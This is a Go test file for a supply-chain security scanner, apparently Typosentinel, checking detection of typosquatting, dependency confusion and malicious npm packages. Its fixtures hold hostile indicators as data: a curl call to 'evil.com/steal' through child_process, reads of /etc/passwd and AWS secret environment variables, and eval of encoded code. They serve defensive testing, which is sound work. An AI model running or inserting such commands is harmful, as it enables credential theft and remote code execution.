package tests

import (
	"context"
	"testing"
	"time"

	"github.com/Alivanroy/Typosentinel/internal/scanner"
	"github.com/Alivanroy/Typosentinel/pkg/types"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestSupplyChainAttackDetection tests comprehensive supply chain attack detection
func TestSupplyChainAttackDetection(t *testing.T) {
	ctx := context.Background()
	
	// Initialize enhanced scanner for supply chain analysis
	enhancedScanner := setupEnhancedScanner(t)
	
	t.Run("DetectTyposquattingAttacks", func(t *testing.T) {
		testTyposquattingDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("DetectDependencyConfusion", func(t *testing.T) {
		testDependencyConfusionDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("DetectMaliciousPackages", func(t *testing.T) {
		testMaliciousPackageDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("DetectBuildIntegrityIssues", func(t *testing.T) {
		testBuildIntegrityDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("DetectZeroDayThreats", func(t *testing.T) {
		testZeroDayThreatDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("DetectHoneypotPackages", func(t *testing.T) {
		testHoneypotDetection(t, ctx, enhancedScanner)
	})
	
	t.Run("AnalyzeDependencyGraph", func(t *testing.T) {
		testDependencyGraphAnalysis(t, ctx, enhancedScanner)
	})
	
	t.Run("ThreatIntelligenceIntegration", func(t *testing.T) {
		testThreatIntelligenceIntegration(t, ctx, enhancedScanner)
	})
}

func testTyposquattingDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test cases for typosquatting attacks
	testCases := []struct {
		name           string
		packageName    string
		expectedThreat bool
		description    string
	}{
		{
			name:           "ExactMatch",
			packageName:    "requests",
			expectedThreat: false,
			description:    "Legitimate package should not trigger typosquatting detection",
		},
		{
			name:           "CharacterSubstitution",
			packageName:    "reqeusts", // 'u' and 'e' swapped
			expectedThreat: true,
			description:    "Character substitution typosquatting should be detected",
		},
		{
			name:           "CharacterOmission",
			packageName:    "reqests", // missing 'u'
			expectedThreat: true,
			description:    "Character omission typosquatting should be detected",
		},
		{
			name:           "CharacterInsertion",
			packageName:    "reqquests", // extra 'q'
			expectedThreat: true,
			description:    "Character insertion typosquatting should be detected",
		},
		{
			name:           "KeyboardLayout",
			packageName:    "rwquests", // 'e' -> 'w' (keyboard proximity)
			expectedThreat: true,
			description:    "Keyboard layout typosquatting should be detected",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			pkg := createTestPackage(tc.packageName, "1.0.0")
			
			// Simulate scanning the package
			result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
			require.NoError(t, err)
			
			// Check if typosquatting threat was detected
			hasTyposquattingThreat := false
			for _, pkg := range result.Packages {
				for _, threat := range pkg.Threats {
					if threat.Type == types.ThreatTypeTyposquatting {
						hasTyposquattingThreat = true
						break
					}
				}
			}
			
			assert.Equal(t, tc.expectedThreat, hasTyposquattingThreat, tc.description)
		})
	}
}

func testDependencyConfusionDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test dependency confusion attacks
	testCases := []struct {
		name        string
		packageName string
		version     string
		expected    bool
	}{
		{
			name:        "InternalPackageConflict",
			packageName: "internal-auth-lib",
			version:     "1.0.0",
			expected:    true,
		},
		{
			name:        "PublicPackageNormal",
			packageName: "lodash",
			version:     "4.17.21",
			expected:    false,
		},
		{
			name:        "SuspiciousVersionBump",
			packageName: "company-utils",
			version:     "999.999.999",
			expected:    true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			pkg := createTestPackage(tc.packageName, tc.version)
			
			result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
			require.NoError(t, err)
			
			hasConfusionThreat := false
			for _, pkg := range result.Packages {
				for _, threat := range pkg.Threats {
					if threat.Type == types.ThreatTypeDependencyConfusion {
						hasConfusionThreat = true
						break
					}
				}
			}
			
			assert.Equal(t, tc.expected, hasConfusionThreat)
		})
	}
}

func testMaliciousPackageDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test malicious package detection
	maliciousIndicators := []struct {
		name      string
		indicator string
		severity  types.Severity
	}{
		{
			name:      "SuspiciousNetworkCall",
			indicator: "http://malicious-domain.com/collect",
			severity:  types.SeverityHigh,
		},
		{
			name:      "FileSystemAccess",
			indicator: "/etc/passwd",
			severity:  types.SeverityMedium,
		},
		{
			name:      "EnvironmentVariableAccess",
			indicator: "process.env.AWS_SECRET_ACCESS_KEY",
			severity:  types.SeverityHigh,
		},
		{
			name:      "ObfuscatedCode",
			indicator: "eval(atob('bWFsaWNpb3VzX2NvZGU='))",
			severity:  types.SeverityCritical,
		},
	}
	
	for _, indicator := range maliciousIndicators {
		t.Run(indicator.name, func(t *testing.T) {
			pkg := createTestPackageWithContent(
				"suspicious-package",
				"1.0.0",
				indicator.indicator,
			)
			
			result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
			require.NoError(t, err)
			
			// Check for malicious behavior detection
			hasMaliciousThreat := false
			for _, pkg := range result.Packages {
				for _, threat := range pkg.Threats {
					if threat.Severity >= indicator.severity {
						hasMaliciousThreat = true
						break
					}
				}
			}
			
			assert.True(t, hasMaliciousThreat, "Should detect malicious indicator: %s", indicator.indicator)
		})
	}
}

func testBuildIntegrityDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test build integrity issues
	pkg := createTestPackage("test-package", "1.0.0")
	
	result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
	require.NoError(t, err)
	
	// Check for build integrity findings
	assert.NotNil(t, result.BuildIntegrityFindings)
	
	// Test signature validation
	for _, finding := range result.BuildIntegrityFindings {
		assert.NotEmpty(t, finding.ID)
		assert.NotEmpty(t, finding.Type)
		assert.NotZero(t, finding.Confidence)
		assert.NotZero(t, finding.DetectedAt)
	}
}

func testZeroDayThreatDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test zero-day threat detection
	pkg := createTestPackageWithAnomalousCode("zero-day-test", "1.0.0")
	
	result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
	require.NoError(t, err)
	
	// Check for zero-day findings
	assert.NotNil(t, result.ZeroDayFindings)
	
	for _, finding := range result.ZeroDayFindings {
		assert.NotEmpty(t, finding.ID)
		assert.NotEmpty(t, finding.BehaviorType)
		assert.True(t, finding.AnomalyScore >= 0.0 && finding.AnomalyScore <= 1.0)
		assert.NotEmpty(t, finding.Recommendation)
	}
}

func testHoneypotDetection(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test honeypot package detection
	honeypotPackages := []string{
		"honeypot-test-package",
		"fake-popular-lib",
		"trap-package-v2",
	}
	
	for _, pkgName := range honeypotPackages {
		t.Run(pkgName, func(t *testing.T) {
			pkg := createTestPackage(pkgName, "1.0.0")
			
			result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
			require.NoError(t, err)
			
			// Check for honeypot detections
			assert.NotNil(t, result.HoneypotDetections)
			
			if len(result.HoneypotDetections) > 0 {
				detection := result.HoneypotDetections[0]
				assert.NotEmpty(t, detection.ID)
				assert.NotEmpty(t, detection.Type)
				assert.True(t, detection.Confidence > 0.5)
			}
		})
	}
}

func testDependencyGraphAnalysis(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test dependency graph analysis
	pkg := createTestPackageWithDependencies("main-package", "1.0.0", []string{
		"dep1@1.0.0",
		"dep2@2.0.0",
		"dep3@1.5.0",
	})
	
	result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
	require.NoError(t, err)
	
	// Check dependency graph
	assert.NotNil(t, result.DependencyGraph)
	assert.True(t, len(result.DependencyGraph.Nodes) > 0)
	assert.True(t, len(result.DependencyGraph.Edges) > 0)
	assert.True(t, result.DependencyGraph.Depth > 0)
	
	// Verify graph structure
	for _, node := range result.DependencyGraph.Nodes {
		assert.NotEmpty(t, node.ID)
		assert.NotNil(t, node.Package)
		assert.True(t, node.Level >= 0)
	}
	
	for _, edge := range result.DependencyGraph.Edges {
		assert.NotEmpty(t, edge.From)
		assert.NotEmpty(t, edge.To)
		assert.NotEmpty(t, edge.RelationType)
	}
}

func testThreatIntelligenceIntegration(t *testing.T, ctx context.Context, scanner *scanner.EnhancedScanner) {
	// Test threat intelligence integration
	knownMaliciousPackages := []string{
		"known-malware-package",
		"reported-backdoor-lib",
		"compromised-utility",
	}
	
	for _, pkgName := range knownMaliciousPackages {
		t.Run(pkgName, func(t *testing.T) {
			pkg := createTestPackage(pkgName, "1.0.0")
			
			result, err := scanner.ScanWithSupplyChainAnalysis(ctx, pkg.Name)
			require.NoError(t, err)
			
			// Check threat intelligence findings
			assert.NotNil(t, result.ThreatIntelFindings)
			
			for _, finding := range result.ThreatIntelFindings {
				assert.NotEmpty(t, finding.ID)
				assert.NotEmpty(t, finding.Source)
				assert.NotEmpty(t, finding.Type)
				assert.True(t, finding.Confidence > 0.0)
				assert.NotZero(t, finding.DetectedAt)
			}
		})
	}
}

// Helper functions for creating test packages

func setupEnhancedScanner(t *testing.T) *scanner.EnhancedScanner {
	// This would normally initialize a real enhanced scanner
	// For testing, we'll create a mock or test version
	// Implementation depends on the actual scanner setup
	return &scanner.EnhancedScanner{}
}

func createTestPackage(name, version string) *types.Package {
	return &types.Package{
		Name:      name,
		Version:   version,
		Registry:  "npm",
		RiskLevel: types.SeverityLow,
		RiskScore: 0.0,
		AnalyzedAt: time.Now(),
	}
}

func createTestPackageWithContent(name, version, content string) *types.Package {
	pkg := createTestPackage(name, version)
	// Since Package doesn't have Files field, we'll store content in metadata
	if pkg.Metadata == nil {
		pkg.Metadata = &types.PackageMetadata{}
	}
	if pkg.Metadata.Metadata == nil {
		pkg.Metadata.Metadata = make(map[string]interface{})
	}
	pkg.Metadata.Metadata["test_content"] = content
	return pkg
}

func createTestPackageWithAnomalousCode(name, version string) *types.Package {
	anomalousCode := `
		// Suspicious code patterns
		eval(process.env.MALICIOUS_CODE);
		require('child_process').exec('curl http://evil.com/steal');
		fs.readFileSync('/etc/passwd');
		process.env.AWS_SECRET_ACCESS_KEY;
	`
	return createTestPackageWithContent(name, version, anomalousCode)
}

func createTestPackageWithDependencies(name, version string, deps []string) *types.Package {
	pkg := createTestPackage(name, version)
	pkg.Dependencies = make([]types.Dependency, len(deps))
	
	for i, dep := range deps {
		pkg.Dependencies[i] = types.Dependency{
			Name:    dep,
			Version: "latest",
			Registry: "npm",
			Direct:  true,
		}
	}
	
	return pkg
}